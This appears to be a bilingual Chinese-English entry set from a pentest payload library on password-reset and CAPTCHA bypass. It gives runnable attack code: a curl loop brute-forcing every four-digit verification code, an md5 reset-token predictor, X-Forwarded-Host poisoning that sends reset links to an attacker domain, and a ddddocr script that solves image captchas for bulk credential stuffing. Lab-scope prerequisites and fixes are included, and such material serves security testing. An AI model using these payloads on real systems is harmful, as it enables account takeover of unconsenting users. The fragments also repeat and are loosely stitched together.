description.zh: 向密码重置接口注入 X-Forwarded-Host 指向攻击者域名；生成的重置链接指向攻击者服务器，受害者点击后重置 token 落入手中即完成链接劫持。
description.en: Inject X-Forwarded-Host pointing at the attacker domain into the reset request; when the mailed link targets the attacker server, the victim's click hands over the reset token.

description.zh: 循环提交 0000 至 9999 全部四位验证码并监测响应；接口无尝试次数限制时命中 success 即接管验证环节，拿到修改密码的通行证。
description.en: Submit every four-digit code from 0000 to 9999 while watching responses; without attempt limits, a success hit hands over the verification step and the password-change pass.

attackChain.payload:
for code in $(seq -w 0000 9999); do
response=$(curl -s -X POST "https://{TARGET}/api/verify-code" \
-H "Content-Type: application/json" \
-d "{\"phone\":\"13800138000\",\"code\":\"$code\"}")
if echo "$response" | grep -q "success"; then
echo "[+] Code found: $code"
break
fi
done

description.zh: 拦截验证码校验的失败响应，把 code 字段改为 200 并补造 token；前端仅依赖响应状态判断即放行后续流程，直接进入设置新密码页面。
description.en: Intercept the failed verification response and rewrite code to 200 with a token; a front end trusting only the status field lets the flow continue straight to the new-password page.

description.zh: 依据 md5 括号内为时间戳与用户名的生成结构，用已知时间戳与受害者邮箱离线计算令牌；预测值与服务端令牌一致即可重置任意账户。
description.en: Reverse the md5(timestamp_username) structure and compute tokens offline from known timestamps and the victim email; a matching prediction unlocks arbitrary account resets.

attackChain.payload:
# token 格式为 md5(时间戳_用户名)，如 token1: 1707811200_user1、token2: 1707811260_user2
import hashlib
timestamp = 1707811200
email = "victim@{TARGET}"
token = hashlib.md5(f"{timestamp}_{email}".encode()).hexdigest()
predicted = hashlib.md5(b"1707811200_victim@{TARGET}").hexdigest()

title.zh: Host 混淆变体扩大劫持面

description.zh: 用双 Host 头、绝对 URI 与多重 X-Forwarded 系列头构造混淆请求；任一变体仍生成指向攻击者域的重置链接即绕过域名校验。
description.en: Craft confused requests with dual Host headers, absolute URIs and stacked X-Forwarded headers; any variant still minting attacker-domain reset links bypasses the host validation.

analysis.zh: 密码重置令牌绑定验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Password-Reset Token Binding Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

title.zh: 四位验证码全遍历脚本

execution.command:
for code in $(seq -w 0000 9999); do
response=$(curl -s -X POST "https://{TARGET}/api/verify-code" \
-H "Content-Type: application/json" \
-d "{\"phone\":\"13800138000\",\"code\":\"$code\"}")
if echo "$response" | grep -q "success"; then
echo "[+] Code found: $code"
break
fi
done

description.zh: 循环提交 0000-9999 全部四位验证码，命中 success 响应即输出验证码并停止，检验验证码尝试次数限制。
description.en: Submits all four-digit codes from 0000 to 9999, printing the code on the first success response to test the verification-code attempt limit.

execution.command:
# token 格式为 md5(时间戳_用户名)，如 token1: 1707811200_user1、token2: 1707811260_user2
import hashlib
timestamp = 1707811200
email = "victim@{TARGET}"
token = hashlib.md5(f"{timestamp}_{email}".encode()).hexdigest()
predicted = hashlib.md5(b"1707811200_victim@{TARGET}").hexdigest()

description.en: Reconstructs the reset-token algorithm as md5(timestamp_username), then computes a prediction offline from a known timestamp and email to assess token unpredictability.

name.zh: 验证码服务端消费验证

description.zh: 覆盖验证码服务端校验缺陷验证：从短信验证码响应泄露与重放登录，到验证码字段缺失/空值与万能验证码调试参数，并附 OCR 识别登录脚本，用于确认验证码是否真正在服务端强制校验。
description.en: Covers server-side captcha validation flaws: from SMS code response leakage and replay login through missing/empty captcha fields and universal-code debug parameters, with an OCR-recognition login script, confirming whether captchas are truly enforced server-side.

prerequisites.zh: 确认 验证码服务端消费验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Server-Side CAPTCHA Consumption Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖验证码服务端强制校验场景，检验短信验证码是否泄露、可重放以及字段异常时的旁路。验证维度含响应泄露、重放登录、缺失空值与万能码调试参数四步，对应第 1 至第 4 步。
overview.en: This payload covers server-side captcha enforcement, testing whether SMS codes leak, replay, or bypass under field anomalies. Validation covers response leakage, replayed logins, missing or empty fields, and master codes plus debug parameters, mapped to steps 1 through 4.

vulnerability.zh: 根因在于验证码生成与校验逻辑的服务端约束缺失：验证码随响应回传、消费后不失效、缺失字段跳过校验、调试后门接受万能码，自动化攻击可完整走通登录。
vulnerability.en: The root cause is missing server-side constraints in generation and validation: codes echo back in responses, stay valid after consumption, missing fields skip checks, and debug backdoors accept master codes, letting automation complete login end to end.

exploitation.zh: 第 1 步请求发送短信接口并检查响应体、头与 Cookie 三处是否出现验证码明文；第 2 步以同一验证码连续提交两次登录，第二次成功即确认未消费；第 3 步提交缺失、空值与 null 的 captcha 字段观察是否跳过校验；第 4 步枚举常见弱验证码并以 debug 与 master_code 探测后门。任一步登录成功即确认缺陷。占位符在全局变量菜单替换。
exploitation.en: In step 1, call the SMS-send API checking body, headers and cookies for plaintext codes. In step 2, submit login twice with the same code; a second success confirms no consumption. In step 3, submit missing, empty and null captcha fields watching for skipped validation. In step 4, enumerate weak codes probing backdoors with debug flags and master_code. Login success at any step confirms the defect. Replace placeholders via the global variables menu.

mitigation.zh: 验证码仅在服务端生成与校验、一次性消费并绑定会话；响应剥离验证码字段，入口强制字段 Schema。修复后重放第 1 至第 4 步，所有旁路应被拒绝。
mitigation.en: Generate and validate codes server-side only, consume once bound to the session, strip code fields from responses, and enforce field schemas at entry. After the fix, replay steps 1 through 4: every bypass should be rejected.

title.zh: 从响应中直接截获验证码

description.zh: 请求发送短信接口后检查响应体、X-Captcha-Code 头与 Cookie；验证码以明文字段、响应头或 Base64 Cookie 任一形式回传即可直接读取，无需等待短信。
description.en: After triggering the SMS endpoint inspect the body, X-Captcha-Code header and cookies; a code leaked in any of the three forms can be read instantly without the phone.

description.zh: 用截获的验证码连续提交两次登录请求；第二次仍返回成功即确认验证码消费后未失效，同一码值可以反复使用完成认证。
description.en: Submit the captured code twice in a row; a second success proves the code is never invalidated after consumption and can be reused at will.

title.zh: 异常字段绕过校验逻辑

description.zh: 分别提交缺少 captcha 字段、空字符串与 null 的登录请求；任一请求通过校验即利用服务端判空缺陷直连认证流程，绕过人机验证环节。
description.en: Submit logins with a missing captcha field, empty string and null; any request passing validation exploits null-check logic to reach authentication directly.

title.zh: 尝试万能码与调试后门
title.en: Try master codes and debug backdoors

description.zh: 枚举 000000、123456 等常见弱验证码，并携带 debug=true 与 master_code 提交；命中即发现隐藏的万能验证通道，任意账户可过码。
description.en: Enumerate weak codes such as 000000 and 123456 plus debug=true and master_code payloads; a hit reveals a hidden universal verification channel.

description.zh: 用 ddddocr 自动识别图形验证码并循环提交登录请求；识别能力叠加无频率限制即可规模化撞库，绕过验证码这道防线。
description.en: Auto-solve image captchas with ddddocr and loop login attempts; recognition plus absent rate limits turns the captcha into a speed bump for bulk credential stuffing.

attackChain.payload:
python3 - <<'PY'
import ddddocr
import requests

ocr = ddddocr.DdddOcr()
passwords = ["wrong-pass-1", "wrong-pass-2", "wrong-pass-3"]  # 授权测试口令清单

def solve_captcha(target):
    resp = requests.get(f"https://{target}/captcha/image")
    return ocr.classification(resp.content)

for pwd in passwords:
    captcha = solve_captcha("{TARGET}")
    r = requests.post(
        f"https://{TARGET}/api/login",
        json={"user": "admin", "pass": pwd, "captcha": captcha},
    )
    if "success" in r.text:
        print(f"[+] Password: {pwd}")
PY

analysis.zh: 验证码服务端消费验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Server-Side CAPTCHA Consumption Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.
